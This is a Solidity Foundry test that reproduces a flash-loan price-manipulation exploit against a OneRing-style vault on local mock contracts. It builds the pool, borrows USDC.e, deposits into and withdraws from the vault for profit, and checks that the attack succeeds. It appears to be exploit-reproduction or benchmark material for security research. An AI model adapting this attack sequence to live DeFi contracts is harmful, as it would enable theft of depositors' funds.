// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./MIM.sol";
import "./OneRingVault.sol";
import "./Strategy.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {USDCE} from "@utils/USDCE.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract OneRingTest is Test, BlockLoader {
    USDCE usdce;
    MIM mim;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    Strategy strategy;
    OneRingVault vault;
    AttackContract attackContract;
    address owner;
    address attacker;
    address usdceAddr;
    address mimAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address strategyAddr;
    address vaultAddr;
    address attackContractAddr;
    uint256 blockTimestamp = 1647888248;
    uint112 reserve0pair = 84252468168797;
    uint112 reserve1pair = 105160077240219005280149210;
    uint32 blockTimestampLastpair = 1647888198;
    uint256 kLastpair = 0;
    uint256 price0CumulativeLastpair = 0;
    uint256 price1CumulativeLastpair = 0;
    uint256 totalSupplyvault = 4185979962653993796224466;
    uint256 balanceOfvaultpair = 0;
    uint256 balanceOfvaultattacker = 0;
    uint256 balanceOfvaultstrategy = 0;
    uint256 balanceOfvaultvault = 0;
    uint256 totalSupplymim = 378090762546918984877248087;
    uint256 balanceOfmimpair = 105160077240219005280149210;
    uint256 balanceOfmimattacker = 0;
    uint256 balanceOfmimstrategy = 0;
    uint256 balanceOfmimvault = 0;
    uint256 totalSupplyusdce = 1176800031172955;
    uint256 balanceOfusdcepair = 84252468168797;
    uint256 balanceOfusdceattacker = 0;
    uint256 balanceOfusdcestrategy = 0;
    uint256 balanceOfusdcevault = 0;

    function setUp() public {
        owner = address(this);
        usdce = new USDCE();
        usdceAddr = address(usdce);
        mim = new MIM(
            "Magic Internet Money",
            "MIM",
            18,
            address(0x0000000000000000000000000000000000000000),
            address(0xfA9dA51631268A30Ec3DDd1CcBf46c65FAD99251)
        );
        mimAddr = address(mim);
        pair = new UniswapV2Pair(
            address(usdce),
            address(mim),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        strategy = new Strategy();
        strategyAddr = address(strategy);
        vault = new OneRingVault(
            [address(usdce)],
            address(strategy),
            totalSupplyvault
        );
        vaultAddr = address(vault);
        attackContract = new AttackContract();
        attackContractAddr = address(attackContract);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        usdce.transfer(address(pair), balanceOfusdcepair);
        mim.transfer(address(pair), balanceOfmimpair);
        usdce.transfer(address(strategy), 10_000_000e6);
        strategy.afterDeploy(address(vault), address(pair), address(usdce));
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Usdce Balances: ");
        queryERC20BalanceDecimals(
            address(usdce),
            address(usdce),
            usdce.decimals()
        );
        queryERC20BalanceDecimals(address(mim), address(usdce), mim.decimals());
        emit log_string("");
        emit log_string("Mim Balances: ");
        queryERC20BalanceDecimals(
            address(usdce),
            address(mim),
            usdce.decimals()
        );
        queryERC20BalanceDecimals(address(mim), address(mim), mim.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdce),
            address(pair),
            usdce.decimals()
        );
        queryERC20BalanceDecimals(address(mim), address(pair), mim.decimals());
        emit log_string("");
        emit log_string("Vault Balances: ");
        queryERC20BalanceDecimals(
            address(usdce),
            address(vault),
            usdce.decimals()
        );
        queryERC20BalanceDecimals(address(mim), address(vault), mim.decimals());
        emit log_string("");
        emit log_string("Attackcontract Balances: ");
        queryERC20BalanceDecimals(
            address(usdce),
            address(attackContract),
            usdce.decimals()
        );
        queryERC20BalanceDecimals(
            address(mim),
            address(attackContract),
            mim.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdce.balanceOf(attacker) >= 1e6 + balanceOfusdceattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_owner_usdce(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        usdce.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_usdce(uint256 amount) internal {
        usdce.transfer(owner, amount);
    }

    function borrow_owner_mim(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        mim.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_mim(uint256 amount) internal {
        mim.transfer(owner, amount);
    }

    function borrow_pair_usdce(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        usdce.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_usdce(uint256 amount) internal {
        usdce.transfer(address(pair), amount);
    }

    function borrow_pair_mim(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        mim.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_mim(uint256 amount) internal {
        mim.transfer(address(pair), amount);
    }

    function swap_pair_usdce_mim(uint256 amount) internal {
        usdce.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(usdce);
        path[1] = address(mim);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pair_mim_usdce(uint256 amount) internal {
        mim.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(mim);
        path[1] = address(usdce);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function transaction_vault_usdce(uint256 amount) internal {
        usdce.approve(address(vault), type(uint256).max);
        vault.depositSafe(amount, address(usdce), 1);
        vault.withdraw(vault.balanceOf(address(attacker)), address(usdce));
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_pair_usdce(80000000e6);
        printBalance("After step0 ");
        transaction_vault_usdce(usdce.balanceOf(attacker));
        printBalance("After step1 ");
        payback_pair_usdce((80000000e6 * 1003) / 1000);
        printBalance("After step2 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdce(amt0);
        transaction_vault_usdce(amt1);
        payback_pair_usdce(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
